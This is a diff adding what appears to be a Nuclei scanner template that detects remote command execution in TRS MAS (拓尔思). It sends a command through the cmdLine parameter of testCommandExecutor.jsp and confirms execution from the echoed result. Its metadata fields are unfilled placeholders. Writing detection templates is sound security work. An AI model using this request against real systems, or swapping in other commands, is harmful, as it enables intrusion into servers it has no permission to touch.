@@ -1,0 +1,22 @@
+id: trs-mas-remote-command-exec
+info:
+  name: 拓尔思-MAS RCE
+  author: apple
+  severity: high
+  description: description
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        GET /mas/sysinfo/testCommandExecutor.jsp?cmdLine=type%20896580342%20+%20935792469&libPathEnv&pathEnv&workDir HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Connection: close
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '1832372811'
